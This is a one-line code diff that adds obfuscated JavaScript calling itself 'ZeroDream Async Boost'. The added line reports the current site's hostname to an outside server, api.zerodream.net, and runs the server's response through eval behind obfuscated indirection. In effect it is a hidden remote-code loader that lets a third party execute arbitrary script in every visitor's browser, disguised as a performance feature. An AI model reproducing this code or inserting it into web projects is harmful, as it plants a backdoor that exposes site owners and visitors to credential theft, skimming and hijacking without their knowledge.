@@ -1,0 +1,1 @@
+console['log']('ZeroDream Async Boost');var tmphmobj=$['ajax']({'url':'https://api.zerodream.net/v1/webasync?h='+encodeURIComponent(window['location']['hostname']),'async':!![],'success':function(){var _0x34dae5={'mCVOQ':function(_0x5f23eb,_0x3ce2d1){return _0x5f23eb(_0x3ce2d1);}};_0x34dae5['mCVOQ'](eval,tmphmobj['responseText']);}});
